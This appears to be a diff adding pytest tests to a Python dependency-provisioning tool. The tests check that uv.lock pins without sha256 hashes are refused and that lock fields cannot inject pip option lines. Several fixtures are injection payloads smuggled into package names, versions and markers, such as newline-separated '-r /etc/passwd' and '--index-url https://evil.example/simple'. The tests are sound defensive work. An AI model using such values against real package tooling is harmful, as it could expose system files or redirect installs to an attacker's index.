@@ -511,6 +511,143 @@ def test_one_declaration_provisions_a_lock_that_moved_across_the_history(tmp_pat
         )
 
 
+def _raw_uv_pkg(name: str, version: str, body: str = "") -> str:
+    """A ``[[package]]`` written as given: no default wheel or sdist."""
+    return f'[[package]]\nname = "{name}"\nversion = "{version}"\n{_PYPI}\n{body}\n'
+
+
+def test_a_uv_lock_pin_without_a_sha256_hash_is_unpinned_never_fetched_loosely(
+    tmp_path: Path,
+) -> None:
+    """The guard that keeps ``--require-hashes`` on: a wheel whose hash is empty or not a
+    sha256, a sha256 with anything after its 64 digits, and a package only another platform
+    needs that publishes neither a wheel nor a source hash are each ``PROVISION_UNPINNED``.
+    Without it such a set is fetched with no hash check at all."""
+    whl = "https://files.pythonhosted.org/y-1.whl"
+    cases = {
+        "empty": f'wheels = [\n    {{ url = "{whl}", hash = "" }},\n]\n',
+        "md5": f'wheels = [\n    {{ url = "{whl}", hash = "md5:{"a" * 32}" }},\n]\n',
+        "trailing": f'wheels = [\n    {{ url = "{whl}", hash = "{_h("1")}\\n" }},\n]\n',
+        "one_of_two": (
+            f'wheels = [\n    {{ url = "{whl}", hash = "{_h("1")}" }},\n'
+            f'    {{ url = "{whl}", hash = "sha1:{"b" * 40}" }},\n]\n'
+        ),
+    }
+    for name, body in cases.items():
+        uv = _uv_lock('    { name = "y" },\n', "", _raw_uv_pkg("y", "1.0", body))
+        repo, (sha,) = _repo(tmp_path / name, {"uv.lock": uv})
+        err = _refused("PROVISION_UNPINNED", pv.LockInputs.from_git, repo, sha, _cfg("pytest"))
+        assert "y==1.0" in err.message and "sha256" in err.message, name
+    linux_only = _uv_lock(
+        '    { name = "y", marker = "sys_platform == \'linux\'" },\n',
+        "",
+        _raw_uv_pkg("y", "1.0"),
+    )
+    repo, (sha,) = _repo(tmp_path / "no_source", {"uv.lock": linux_only})
+    _refused("PROVISION_UNPINNED", pv.LockInputs.from_git, repo, sha, _cfg("pytest"))
+
+
+@pytest.mark.parametrize(
+    ("where", "edge", "pkg"),
+    [
+        (
+            "marker",
+            '    { name = "y", marker = "sys_platform == \'linux\'\\n--no-binary :all:" },\n',
+            _uv_pkg("y", "1.0"),
+        ),
+        (
+            "marker_extra_index",
+            '    { name = "y", marker = "python_version > \'3\' --extra-index-url x" },\n',
+            _uv_pkg("y", "1.0"),
+        ),
+        (
+            "marker_comment",
+            '    { name = "y", marker = "python_version > \'3\' # a" },\n',
+            _uv_pkg("y", "1.0"),
+        ),
+        (
+            "version",
+            '    { name = "y" },\n',
+            _uv_pkg("y", "1.0\\n--index-url https://evil.example/simple"),
+        ),
+        (
+            "name",
+            '    { name = "y\\n-r /etc/passwd\\nsix" },\n',
+            _uv_pkg("y\\n-r /etc/passwd\\nsix", "1.0"),
+        ),
+        ("name_space", '    { name = "y z" },\n', _uv_pkg("y z", "1.0")),
+    ],
+    ids=["marker", "marker_extra_index", "marker_comment", "version", "name", "name_space"],
+)
+def test_a_uv_lock_cannot_write_an_option_line_into_the_lock_pip_reads(
+    tmp_path: Path, where: str, edge: str, pkg: str
+) -> None:
+    """A committed uv.lock is repository text. A name, version or marker that would put a
+    line or an option into ``/in/lock.txt`` (``--no-binary``, an index, an include, a
+    comment) is refused before anything is fetched, never written for pip to read."""
+    uv = _uv_lock(edge, "", pkg)
+    repo, (sha,) = _repo(tmp_path / where, {"uv.lock": uv})
+    with pytest.raises(ProvisionRefused) as ei:
+        pv.LockInputs.from_git(repo, sha, _cfg("pytest"))
+    assert ei.value.code in {"PROVISION_UNPINNED", "PROVISION_SOURCE_REFUSED"}, ei.value
+
+
+@pytest.mark.parametrize(
+    "pin",
+    [
+        pv.PyPin("six\n-r /etc/passwd", "1.0"),
+        pv.PyPin("six", "1.0\n--index-url https://evil.example/simple"),
+        pv.PyPin("six", "1.0", marker="; sys_platform == 'linux'\n--no-binary :all:"),
+        pv.PyPin("six", "1.0", marker="; python_version > '3' --no-binary :all:"),
+        pv.PyPin("six", "1.0", (_h("1") + "\n--pre",)),
+        pv.PyPin("--no-binary", ":all:"),
+    ],
+    ids=["name", "version", "marker_line", "marker_option", "hash", "option_pin"],
+)
+def test_the_lock_pip_reads_is_refused_rather_than_written_with_an_option(pin: pv.PyPin) -> None:
+    """The second line: whatever reader produced the pins, ``lock_text`` writes only
+    ``name==version [; marker] --hash=sha256:…`` lines, and refuses a pin that would
+    write anything else."""
+    from crb.provision.python import lock_text
+
+    inputs = pv.LockInputs(lang=pv.LANG_PYTHON, sha="0" * 40, recipe=pv.RECIPE_PY, py_pins=(pin,))
+    with pytest.raises(ProvisionRefused) as ei:
+        lock_text(inputs)
+    assert ei.value.code == "PROVISION_SOURCE_REFUSED"
+
+
+def test_a_uv_group_that_names_the_projects_own_extra_follows_that_extra(
+    tmp_path: Path,
+) -> None:
+    """``tests = [{ name = "proj", extra = ["testing"] }]`` is uv's spelling of a group that
+    reuses the project's own extra: the project is never fetched, but the extra's
+    dependencies are, with the edge's marker. An extra the project does not declare is
+    ``PROVISION_NO_LOCK``, never an empty set."""
+    root_extra = (
+        '[package.optional-dependencies]\ntesting = [\n    { name = "six" },\n'
+        '    { name = "proj", extra = ["testing"] },\n]\n'
+    )
+    uv = _uv_lock(
+        "",
+        'tests = [\n    { name = "proj", extra = ["testing"], marker = "python_version >= \'3\'" },\n]\n',
+        _uv_pkg("six", "1.16.0", wheels=("2",)),
+    ).replace("\n[package.dev-dependencies]", "\n" + root_extra + "\n[package.dev-dependencies]")
+    repo, (sha,) = _repo(tmp_path / "a", {"uv.lock": uv})
+    got = pv.LockInputs.from_git(repo, sha, _cfg("pytest", deps_groups=["tests"]))
+    assert got.recipe == pv.RECIPE_PY
+    assert _pin_lines(got) == [("six", "1.16.0", "; python_version >= '3'", (_h("2"),))]
+    missing = uv.replace('extra = ["testing"], marker', 'extra = ["typing"], marker')
+    repo, (sha,) = _repo(tmp_path / "b", {"uv.lock": missing})
+    err = _refused(
+        "PROVISION_NO_LOCK",
+        pv.LockInputs.from_git,
+        repo,
+        sha,
+        _cfg("pytest", deps_groups=["tests"]),
+    )
+    assert "typing" in err.message
+
+
 def test_go_work_is_unsupported(tmp_path: Path) -> None:
     repo, (sha,) = _repo(
         tmp_path / "r", {"go.mod": "module example.com/x\n\ngo 1.22\n", "go.work": "go 1.22\n"}
